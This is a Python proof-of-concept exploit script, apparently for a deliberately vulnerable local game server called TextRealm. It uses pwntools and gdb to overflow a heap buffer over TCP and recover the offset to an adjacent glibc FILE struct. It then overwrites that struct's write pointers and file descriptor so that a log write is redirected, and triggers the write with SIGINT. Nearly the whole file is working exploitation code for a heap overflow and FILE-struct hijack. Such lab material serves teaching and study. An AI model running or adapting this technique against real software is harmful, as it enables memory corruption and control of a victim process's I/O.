import os
import re
import signal
import socket
import subprocess
import sys
import tempfile
import time

try:
    from pwn import cyclic, cyclic_find, FileStructure, context
except ImportError:
    print("[-] pwntools is required for this PoC (cyclic() pattern generation).")
    print("    pip install pwntools")
    sys.exit(1)

HOST = "127.0.0.1"
PORT = 9999
RECV_CHUNK = 8192
PROMPT = b"> "

SERVER_SRC = os.path.normpath(os.path.join(
    os.path.dirname(os.path.abspath(__file__)),
    "..", "textrealm", "linux", "server_linux.c",
))
SERVER_BIN_SUFFIX = os.path.join("linux", "textrealm_server")
SERVER_LOG_PATH = os.path.normpath(os.path.join(
    os.path.dirname(os.path.dirname(SERVER_SRC)), "game_logs", "textrealm.log",
))

TOTAL_LEN = 3000
FRAG_SIZE = 500

PTRACE_HELP = """\
[-] gdb cannot attach to the server process: Yama ptrace_scope is
    restricted (current value: {scope}) and this script is not running
    as root. gdb here is a fresh process, not a child of the server, so
    the default "restricted ptrace" policy blocks the attach outright.

    Fix ONE of the following, then re-run this script:
      1. Run this whole script with sudo:
             sudo python3 {script}
      2. Temporarily relax ptrace_scope (reverts on reboot):
             echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope
"""


def print_banner(title):
    width = 70
    print()
    print("#" * width)
    print(f"# {title}")
    print("#" * width)
    print()


def pause_for_enter(message="Press Enter to continue..."):
    try:
        input(f"\n>>> {message} ")
    except EOFError:
        pass


def is_game_running(host, port):
    try:
        with socket.create_connection((host, port), timeout=2):
            return True
    except OSError:
        return False


def recv_until_prompt(sock, timeout=5):
    sock.settimeout(timeout)
    data = b""
    while PROMPT not in data:
        chunk = sock.recv(RECV_CHUNK)
        if not chunk:
            raise ConnectionError("connection closed by peer")
        data += chunk
    return data


def check_ptrace_ok():
    if hasattr(os, "geteuid") and os.geteuid() == 0:
        return True
    scope_path = "/proc/sys/kernel/yama/ptrace_scope"
    if not os.path.exists(scope_path):
        return True
    with open(scope_path) as f:
        scope = f.read().strip()
    if scope == "0":
        return True
    print(PTRACE_HELP.format(scope=scope, script=sys.argv[0]))
    return False


def find_server_pid():
    try:
        out = subprocess.check_output(["pgrep", "-f", SERVER_BIN_SUFFIX], text=True)
    except subprocess.CalledProcessError:
        return None
    for pid_str in out.split():
        pid = int(pid_str)
        try:
            exe = os.readlink(f"/proc/{pid}/exe")
        except OSError:
            continue
        if exe.endswith(os.sep + SERVER_BIN_SUFFIX):
            return pid
    return None


def find_overflow_breakpoint_line():
    with open(SERVER_SRC) as f:
        lines = f.readlines()
    for i, line in enumerate(lines, start=1):
        if "memcpy(grave_buf" in line:
            return i + 1
    raise RuntimeError(
        f"could not find 'memcpy(grave_buf' in {SERVER_SRC} - "
        "has the overflow been refactored or removed?"
    )


def find_grave_size():
    with open(SERVER_SRC) as f:
        text = f.read()
    m = re.search(r"\bgrave_size\s*=\s*(\d+)\s*;", text)
    if not m:
        raise RuntimeError(f"could not find 'grave_size = N;' in {SERVER_SRC}")
    return int(m.group(1))


def find_recv_buf_size():
    with open(SERVER_SRC) as f:
        text = f.read()
    m = re.search(r"#define\s+RECV_BUF_SIZE\s+(\d+)", text)
    if not m:
        raise RuntimeError(f"could not find '#define RECV_BUF_SIZE N' in {SERVER_SRC}")
    return int(m.group(1))


def run_gdb_batch(pid, cmds, timeout, label):
    full_cmd = ["gdb", "-q", "-p", str(pid), "--batch"] + cmds
    try:
        proc = subprocess.run(
            full_cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
            text=True, timeout=timeout,
        )
        return proc.stdout
    except subprocess.TimeoutExpired as e:
        return (e.stdout or "") + f"\n[-] {label}: gdb timed out after {timeout}s\n"


RAW_BEFORE_MARKER = "RAW BYTES of *g_log_fp BEFORE any corruption"
TRAILING_REPAIR_MARGIN = 128


def gdb_snapshot_cmds(struct_size):
    return [
        "-ex", "set pagination off",
        "-ex", "set confirm off",
        "-ex", "set print pretty on",
        "-ex", 'printf "grave_buf = %p\\n", grave_buf',
        "-ex", 'printf "g_log_fp  = %p (should be ~20 bytes past grave_buf + grave_size)\\n", g_log_fp',
        "-ex", "print *g_log_fp",
        "-ex", 'printf "\\n=== %s ===\\n"' % RAW_BEFORE_MARKER,
        "-ex", "x/%dxb g_log_fp" % struct_size,
        "-ex", "detach",
        "-ex", "quit",
    ]


OVERFLOW_SCRIPT_TEMPLATE = '''\
import gdb

class OverflowBreakpoint(gdb.Breakpoint):
    def __init__(self, spec, cond, target_hits, label):
        super(OverflowBreakpoint, self).__init__(spec)
        self.cond = cond
        self.target_hits = target_hits
        self.label = label
        self.hits = 0

    def stop(self):
        if not bool(gdb.parse_and_eval(self.cond)):
            return False
        self.hits += 1
        grave_used_val = int(gdb.parse_and_eval("grave_used"))
        n_val = int(gdb.parse_and_eval("n"))
        gdb.write("\\n=== %s: overflow hit %d/%d ===\\n" % (self.label, self.hits, self.target_hits))
        gdb.write("grave_used (before this write) = %d\\n" % grave_used_val)
        gdb.write("n (bytes in this write)        = %d\\n" % n_val)
        if self.hits >= self.target_hits:
            grave_buf_val = gdb.parse_and_eval("grave_buf")
            g_log_fp_val = gdb.parse_and_eval("g_log_fp")
            gdb.write("\\n=== final overflowing write caught - adjacent FILE struct now corrupted ===\\n")
            gdb.write("grave_buf                       = %s\\n" % grave_buf_val)
            gdb.write("g_log_fp (adjacent FILE struct) = %s\\n" % g_log_fp_val)
            gdb.execute("print *g_log_fp")
            gdb.write("\\n=== heap space starting AT the allocation (grave_buf+0 .. +200) ===\\n")
            gdb.execute("x/200xb grave_buf")
            gdb.write("\\n=== heap space spanning end-of-buffer -> FILE struct (grave_buf+__HEXOFF__) ===\\n")
            gdb.execute("x/80xb grave_buf+__HEXOFF__")
            io_read_ptr_field_offset = int(gdb.parse_and_eval(
                "(size_t)&g_log_fp->_IO_read_ptr - (size_t)g_log_fp"))
            gdb.write("\\n=== _IO_read_ptr field offset within FILE struct (from gdb's own type info) = %d bytes ===\\n"
                       % io_read_ptr_field_offset)
            gdb.write("\\n=== raw bytes AT g_log_fp->_IO_read_ptr (for pwntools cyclic_find offset recovery) ===\\n")
            gdb.execute("x/8xb &g_log_fp->_IO_read_ptr")
            return True
        return False

gdb.execute("set pagination off")
gdb.execute("set confirm off")
gdb.execute("set print pretty on")
bp = OverflowBreakpoint("__SRC__:__BPLINE__", "grave_used + n > grave_size", __TARGET__, "__LABEL__")
gdb.execute("continue")
gdb.execute("detach")
'''


def build_overflow_script(bp_line, grave_size, num_overflow_frags, label):
    src_name = os.path.basename(SERVER_SRC)
    hexoff = max(grave_size - 60, 0)
    script = (
        OVERFLOW_SCRIPT_TEMPLATE
        .replace("__HEXOFF__", str(hexoff))
        .replace("__SRC__", src_name)
        .replace("__BPLINE__", str(bp_line))
        .replace("__TARGET__", str(num_overflow_frags))
        .replace("__LABEL__", label)
    )
    fd, path = tempfile.mkstemp(prefix="filestruct_bp_", suffix=".py")
    with os.fdopen(fd, "w") as f:
        f.write(script)
    return path


def print_client_received(data):
    text = data.decode(errors="replace")
    if text.endswith(PROMPT.decode()):
        text = text[:-len(PROMPT.decode())]
    text = text.strip("\r\n")
    if not text:
        return
    print("\n[CLIENT RECEIVED]")
    for line in text.splitlines():
        print(f"    {line}")


def drain_socket(sock, idle_timeout=2):
    sock.settimeout(idle_timeout)
    data = b""
    while True:
        try:
            chunk = sock.recv(RECV_CHUNK)
        except socket.timeout:
            break
        if not chunk:
            break
        data += chunk
    return data


def send_fragment_quiet(sock, idx, payload, frag_count, total_len, sent_before, is_overflow, wait_for_response):
    is_last = (idx == frag_count - 1)
    sent_after = sent_before + len(payload)
    status = "OVERFLOWING grave_buf" if is_overflow else "filling grave_buf"

    preview = payload.decode(errors="replace")
    if len(preview) > 60:
        preview = preview[:60] + "..."

    print(f"\n[Fragment {idx + 1}/{frag_count}]" + ("  <- LAST FRAGMENT" if is_last else ""))
    print(f"    status      : {status}")
    print(f"    bytes       : {len(payload)}")
    print(f"    sent so far : {sent_after}/{total_len}")
    print(f"    content     : {preview}")

    sock.sendall(payload + b"\r\n")

    if wait_for_response:
        try:
            response = recv_until_prompt(sock, timeout=5)
            print_client_received(response)
        except (OSError, ConnectionError):
            pass

    if is_last:
        print("\n[*] That was the LAST fragment - the full payload has now been sent.")

    return sent_after


def fragment_payload(payload, frag_size):
    frag_count = (len(payload) + frag_size - 1) // frag_size
    return {i: payload[i * frag_size:(i + 1) * frag_size] for i in range(frag_count)}, frag_count


def first_overflow_index(frag_count, frag_size, grave_size):
    return next(i for i in range(frag_count) if (i + 1) * frag_size > grave_size)


def recover_file_struct_offset(gdb_output):
    offset_marker = "_IO_read_ptr field offset within FILE struct (from gdb's own type info) ="
    bytes_marker = "raw bytes AT g_log_fp->_IO_read_ptr"

    m_off = re.search(re.escape(offset_marker) + r"\s*(\d+)\s*bytes", gdb_output)
    if not m_off:
        return None
    io_read_ptr_field_offset = int(m_off.group(1))

    idx = gdb_output.find(bytes_marker)
    if idx == -1:
        return None
    tail = gdb_output[idx:]
    m_bytes = re.search(r"0x[0-9a-fA-F]+:\s*((?:0x[0-9a-fA-F]{1,2}\s*)+)", tail)
    if not m_bytes:
        return None
    byte_tokens = m_bytes.group(1).split()
    raw = bytes(int(tok, 16) for tok in byte_tokens)
    if len(raw) < 4:
        return None

    pattern_offset_of_io_read_ptr = cyclic_find(raw[:4])
    struct_start_offset = pattern_offset_of_io_read_ptr - io_read_ptr_field_offset

    return {
        "raw_bytes": raw[:4],
        "io_read_ptr_field_offset": io_read_ptr_field_offset,
        "pattern_offset_of_io_read_ptr": pattern_offset_of_io_read_ptr,
        "struct_start_offset": struct_start_offset,
    }


FILL_BYTE = 0x11


def build_filled_file_structure(fill_byte=FILL_BYTE):
    return bytes([fill_byte]) * file_struct_size()


def parse_grave_buf_addr(gdb_output):
    m = re.search(r"grave_buf\s+=\s*(0x[0-9a-fA-F]+)", gdb_output)
    if not m:
        return None
    return int(m.group(1), 16)


def file_struct_layout():
    context.arch = "amd64"
    fs = FileStructure(null=0)
    layout = {}
    pos = 0
    for name in fs.vars_:
        size = fs.length[name]
        layout[name] = (pos, size)
        pos += size
    return layout


def file_struct_size():
    context.arch = "amd64"
    return len(bytes(FileStructure(null=0)))


WRITE_BUFFER_ROOM = 512


def patch_struct_for_stdio_redirect(pristine, addr, message):
    layout = file_struct_layout()
    buf = bytearray(pristine)

    def set_field(name, value):
        off, size = layout[name]
        buf[off:off + size] = int(value).to_bytes(size, "little")

    set_field("_IO_write_base", addr)
    set_field("_IO_write_ptr", addr + len(message))
    set_field("_IO_write_end", addr + WRITE_BUFFER_ROOM)
    set_field("fileno", 1)
    return bytes(buf)


def parse_hex_dump_bytes(gdb_output, marker, nbytes):
    idx = gdb_output.find(marker)
    if idx == -1:
        return None
    raw = bytearray()
    for line in gdb_output[idx + len(marker):].splitlines():
        m = re.match(r"\s*0x[0-9a-fA-F]+:\s*((?:0x[0-9a-fA-F]{1,2}\s*)+)$", line)
        if m is None:
            if raw:
                break
            continue
        for tok in m.group(1).split():
            raw.append(int(tok, 16))
        if len(raw) >= nbytes:
            break
    if len(raw) < nbytes:
        return None
    return bytes(raw[:nbytes])


def is_pid_alive(pid):
    try:
        os.kill(pid, 0)
    except OSError:
        return False
    return True


def proc_state(pid):
    try:
        with open(f"/proc/{pid}/stat") as f:
            data = f.read()
    except OSError:
        return None
    after = data.rsplit(")", 1)[-1].split()
    return after[0] if after else None


def read_log_tail(n=5):
    try:
        with open(SERVER_LOG_PATH) as f:
            lines = f.readlines()
        return lines[-n:]
    except OSError:
        return []


def read_log_all():
    try:
        with open(SERVER_LOG_PATH) as f:
            return f.readlines()
    except OSError:
        return []


def run_overflow_demo(pid, bp_line, grave_size, fragments, frag_count, first_overflow_idx,
                       intro_message, run_tag):
    num_overflow_frags = frag_count - first_overflow_idx
    total_len = sum(len(p) for p in fragments.values())
    sent_so_far = 0

    sock = socket.create_connection((HOST, PORT), timeout=5)
    recv_until_prompt(sock)
    print_banner(intro_message)

    for i in range(first_overflow_idx):
        sent_so_far = send_fragment_quiet(
            sock, i, fragments[i], frag_count, total_len, sent_so_far,
            is_overflow=False, wait_for_response=True,
        )

    label = f"{run_tag} ({num_overflow_frags} fragments)"
    script_path = build_overflow_script(bp_line, grave_size, num_overflow_frags, label)
    print_banner(f"ATTACHING GDB (persistent) - {label}")

    gdb_proc = subprocess.Popen(
        ["gdb", "-q", "-p", str(pid), "--batch", "-x", script_path],
        stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True,
    )
    time.sleep(1.5)

    try:
        for i in range(first_overflow_idx, frag_count):
            sent_so_far = send_fragment_quiet(
                sock, i, fragments[i], frag_count, total_len, sent_so_far,
                is_overflow=True, wait_for_response=False,
            )
            time.sleep(0.15)

        try:
            out, _ = gdb_proc.communicate(timeout=30)
        except subprocess.TimeoutExpired:
            print("[-] gdb did not finish in time - the breakpoint's target "
                  "hit count may not have been reached (fragments may have "
                  "coalesced into fewer memcpy() calls than expected). "
                  "Killing gdb; the server may still be paused.")
            gdb_proc.kill()
            out, _ = gdb_proc.communicate()
    finally:
        try:
            os.remove(script_path)
        except OSError:
            pass

    pause_for_enter("Hit Enter to print the FILE struct and heap now...")
    print_banner(f"GDB VIEW NOW - {label}")
    print(out)

    print_client_received(drain_socket(sock))
    sock.close()
    return out


def main():
    if not is_game_running(HOST, PORT):
        print(f"[-] Nothing is listening on {HOST}:{PORT}. Is TextRealm running?")
        return
    print(f"[+] Game is running on {HOST}:{PORT}")

    if not check_ptrace_ok():
        return

    pid = find_server_pid()
    if pid is None:
        print(f"[-] Could not find a running '.../{SERVER_BIN_SUFFIX}' process via pgrep.")
        return
    print(f"[+] Found server process pid={pid}")

    bp_line = find_overflow_breakpoint_line()
    grave_size = find_grave_size()
    src_name = os.path.basename(SERVER_SRC)
    print(f"[+] Discovered breakpoint location {src_name}:{bp_line} and "
          f"grave_size={grave_size} by reading the live source just now - "
          f"not hardcoded.")

    pattern = cyclic(TOTAL_LEN)
    frag_count = TOTAL_LEN // FRAG_SIZE
    fragments = {i: pattern[i * FRAG_SIZE:(i + 1) * FRAG_SIZE] for i in range(frag_count)}
    first_overflow_idx = next(i for i in range(frag_count) if (i + 1) * FRAG_SIZE > grave_size)
    num_overflow_frags = frag_count - first_overflow_idx

    print(f"[+] Built a {TOTAL_LEN}-byte cyclic pattern -> {frag_count} fragments "
          f"of {FRAG_SIZE} bytes each.")
    print(f"[+] Fragments 0-{first_overflow_idx - 1} fill grave_buf exactly to its "
          f"{grave_size}-byte limit (no overflow yet).")
    print(f"[+] Fragments {first_overflow_idx}-{frag_count - 1} "
          f"({num_overflow_frags} of them) each write PAST the end of grave_buf.")

    print_banner("GDB SNAPSHOT: *g_log_fp BEFORE any overflow")
    struct_size = file_struct_size()
    snapshot_size = struct_size + TRAILING_REPAIR_MARGIN
    before = run_gdb_batch(pid, gdb_snapshot_cmds(snapshot_size), timeout=10, label="BEFORE snapshot")
    print(before)
    pristine_struct = parse_hex_dump_bytes(before, RAW_BEFORE_MARKER, struct_size)
    pristine_trailing = parse_hex_dump_bytes(before, RAW_BEFORE_MARKER, snapshot_size)
    if pristine_trailing is not None:
        pristine_trailing = pristine_trailing[struct_size:]
    if pristine_struct is None:
        print("[-] Could not capture the pristine FILE struct bytes - the "
              "stdout-redirect demo (phase 4) will not be available this run.")
    pause_for_enter("Hit Enter to start sending fragments...")

    out1 = run_overflow_demo(
        pid, bp_line, grave_size, fragments, frag_count, first_overflow_idx,
        "Here's where we begin overflowing the allocated heap space (cyclic pattern)",
        "cyclic pattern overflow",
    )

    result = recover_file_struct_offset(out1)
    print_banner("OFFSET RECOVERY - HOW IT WAS CALCULATED")
    if result is None:
        print("[-] Could not recover the offset (gdb likely never reached "
              "the final breakpoint hit - see the ptrace_scope note above). "
              "Skipping the targeted FileStructure overwrite.")
        return

    offset = result["struct_start_offset"]
    padding = result["io_read_ptr_field_offset"] - 4
    print(f"[+] Step 1 - WHERE we read from: the breakpoint's final hit dumped "
          f"the 8 raw bytes stored AT the _IO_read_ptr field.")
    print(f"    We do NOT read _flags (the very first field) directly: _flags "
          f"is only 4 bytes, and the compiler inserts {padding} bytes of "
          f"alignment padding between it and _IO_read_ptr (pointers need "
          f"8-byte alignment on x86-64) - easy to silently get a wrong "
          f"offset from if you assume no padding.")
    print(f"    raw bytes found at _IO_read_ptr : {result['raw_bytes'].hex()}  "
          f"(as ASCII: {result['raw_bytes'].decode(errors='replace')!r})")
    print()
    print(f"[+] Step 2 - THE LOOKUP: a de Bruijn sequence is built so every "
          f"4-byte window in it is unique. pwntools cyclic_find() takes those "
          f"4 bytes and tells us exactly which byte offset of our original "
          f"{TOTAL_LEN}-byte payload they came from.")
    print(f"    cyclic_find({result['raw_bytes'].hex()}) = "
          f"{result['pattern_offset_of_io_read_ptr']}")
    print()
    print(f"[+] Step 3 - THE CORRECTION: that lookup gives the offset of the "
          f"_IO_read_ptr FIELD, not the start of the struct. _IO_read_ptr "
          f"itself sits {result['io_read_ptr_field_offset']} bytes into the "
          f"struct (discovered dynamically via gdb's own type info - "
          f"'(size_t)&g_log_fp->_IO_read_ptr - (size_t)g_log_fp' - not a "
          f"hardcoded guess), so we subtract that back out:")
    print(f"    {result['pattern_offset_of_io_read_ptr']} - "
          f"{result['io_read_ptr_field_offset']} = {offset}")
    print()
    print(f"[+] FINAL ANSWER: grave_buf + {offset} == g_log_fp "
          f"(the start of the FILE struct).")
    pause_for_enter("Hit Enter to validate this offset is actually correct...")

    recv_buf_size = find_recv_buf_size()
    frag2_size = min(FRAG_SIZE, recv_buf_size - 1)
    filled_struct = build_filled_file_structure()
    payload2 = b"A" * offset + filled_struct

    print_banner("TARGETED OVERWRITE SETUP")
    print(f"[*] To test the recovered offset, we are going to overwrite the "
          f"FILE struct with a copy of pwntools' FileStructure with every "
          f"field filled with 0x{FILL_BYTE:02x} bytes - if the offset is "
          f"correct, *g_log_fp should read back as nothing but "
          f"0x{FILL_BYTE:02x} afterward.")

    fragments2, frag_count2 = fragment_payload(payload2, frag2_size)
    first_overflow_idx2 = first_overflow_index(frag_count2, frag2_size, grave_size)

    print(f"[+] RECV_BUF_SIZE={recv_buf_size} (discovered live) -> re-fragmenting "
          f"into {frag2_size}-byte chunks.")
    print(f"[+] payload2 = {offset} filler bytes + {len(filled_struct)}-byte "
          f"all-0x{FILL_BYTE:02x} FileStructure (sizeof(FILE) per pwntools) = "
          f"{len(payload2)} bytes -> {frag_count2} fragments.")

    out3 = run_overflow_demo(
        pid, bp_line, grave_size, fragments2, frag_count2, first_overflow_idx2,
        f"Here's where we overwrite the FILE struct with an all-0x{FILL_BYTE:02x} FileStructure payload",
        "targeted FileStructure overwrite",
    )

    print_banner("DONE")
    fill_hex = f"0x{FILL_BYTE:02x}"
    if re.search(r"(?:" + re.escape(fill_hex) + r"\s+){7}" + re.escape(fill_hex), out3.lower()):
        print(f"[+] *g_log_fp now reads back as {fill_hex} bytes - the offset "
              f"({offset}) was correct and the FileStructure overwrite landed "
              "exactly on the FILE struct.")
    else:
        print(f"[!] Did not see the expected run of {fill_hex} bytes in the "
              "final *g_log_fp dump above - re-check the offset/output "
              "manually (gdb may not have attached - see ptrace_scope note).")

    pause_for_enter("Hit Enter to continue to the final demo: redirecting a write to stdout...")

    message = b"This is an example of being able to redirect writing to somewhere else!\n"
    grave_buf_addr = parse_grave_buf_addr(out3)

    print_banner("FINAL DEMO SETUP - REDIRECTING A WRITE TO STDOUT")
    if grave_buf_addr is None:
        print("[-] Could not recover grave_buf's address from the previous "
              "gdb output - skipping the stdout-redirect demo.")
        return
    if pristine_struct is None:
        print("[-] No pristine FILE struct bytes were captured at startup - "
              "skipping the stdout-redirect demo.")
        return

    print(f"[+] grave_buf address (reused from the previous gdb dump) = "
          f"{hex(grave_buf_addr)}")
    print(f"[+] message ({len(message)} bytes), placed at the very start of "
          f"grave_buf so its address is exactly {hex(grave_buf_addr)}:")
    print(f"    {message!r}")
    print(f"[+] Starting from the PRISTINE {len(pristine_struct)}-byte FILE "
          f"struct captured before any corruption, we patch only 4 fields:")
    print(f"      fileno         = 1                          (fd 1, stdout)")
    print(f"      _IO_write_base = {hex(grave_buf_addr)}       (start of our message)")
    print(f"      _IO_write_ptr  = {hex(grave_buf_addr + len(message))}  "
          f"(= _IO_write_base + {len(message)} - a POINTER, not a byte "
          f"count: glibc computes the write length as "
          f"_IO_write_ptr - _IO_write_base, so it has to be addr+len for "
          f"that subtraction to come out to {len(message)})")
    print(f"      _IO_write_end  = {hex(grave_buf_addr + WRITE_BUFFER_ROOM)}  "
          f"(gives the buffer real room, since g_log_fp has never been "
          f"written to before and its pristine _IO_write_end is 0)")
    print(f"    Every other field (vtable, _lock, _wide_data, ...) is left "
          f"untouched at its real, legitimate value.")

    struct_payload = patch_struct_for_stdio_redirect(pristine_struct, grave_buf_addr, message)
    if pristine_trailing:
        struct_payload += pristine_trailing
        print(f"[+] Also restoring {len(pristine_trailing)} pristine bytes "
              f"immediately AFTER the struct (covers _lock's and "
              f"_wide_data's target allocations, which phase 1's overshoot "
              f"corrupts and nothing else repairs).")
    filler = message + b"A" * (offset - len(message))
    payload4 = filler + struct_payload
    fragments4, frag_count4 = fragment_payload(payload4, frag2_size)
    first_overflow_idx4 = first_overflow_index(frag_count4, frag2_size, grave_size)

    print(f"[+] payload4 = message ({len(message)} bytes) + {offset - len(message)} "
          f"filler bytes + {len(struct_payload)}-byte patched FILE struct "
          f"= {len(payload4)} bytes -> {frag_count4} fragments.")

    run_overflow_demo(
        pid, bp_line, grave_size, fragments4, frag_count4, first_overflow_idx4,
        "Here's where we overwrite the FILE struct so its next write gets redirected to stdout",
        "stdout write-redirect (FileStructure.write)",
    )

    pause_for_enter(
        "Hit Enter to trigger the write and watch it redirect to stdout - "
        "this sends SIGINT (like Ctrl+C) to the server and will end this "
        "server process..."
    )
    print_banner("TRIGGERING THE REDIRECTED WRITE")

    current_pid = find_server_pid()
    if current_pid != pid:
        print(f"[!] pid changed since this script started (was {pid}, now "
              f"{current_pid}) - the server must have respawned. Signaling "
              f"the CURRENT pid instead; its FILE struct was never "
              f"corrupted, so the redirect below will NOT happen.")
        pid = current_pid
    state = proc_state(pid)
    print(f"[+] pid={pid} /proc state = {state!r} "
          f"({'OK, running/sleeping normally' if state in ('R', 'S') else 'NOT R/S - may not handle signals right now'})")

    print(f"[*] Sending SIGINT to pid={pid}. Watch the SERVER's OWN "
          f"console/terminal (not this one) for:")
    print(f"    {message.decode().strip()!r}")

    lines_before = len(read_log_all())
    os.kill(pid, signal.SIGINT)
    time.sleep(1)

    print_banner("RESULT")
    if is_pid_alive(pid):
        print("[!] Server process is still alive 1s after SIGINT - the "
              "signal was not handled. Check proc_state above: if it "
              "wasn't 'R'/'S', the process was likely stuck in a "
              "ptrace-stopped state left over from an earlier gdb "
              "attach/detach.")
    else:
        log_after = read_log_all()
        new_lines = log_after[lines_before:]
        interrupted = any("INTERRUPTED" in line for line in new_lines)
        if interrupted:
            print("[!] Server exited, but textrealm.log DID get a normal "
                  "\"INTERRUPTED server received SIGINT\" line - the "
                  "redirect did NOT take effect.")
        elif new_lines:
            print("[+] Server exited and NO \"INTERRUPTED\" line was added "
                  "to textrealm.log - exactly what we'd expect if the "
                  "fwrite()/fflush() got redirected to fd 1 instead of the "
                  "real log file. New log activity instead:")
            for line in new_lines:
                print(f"    {line.rstrip()}")
        else:
            print("[?] Server exited and textrealm.log did not change at "
                  "all - check the server's own console/terminal for the "
                  "message.")


if __name__ == "__main__":
    main()
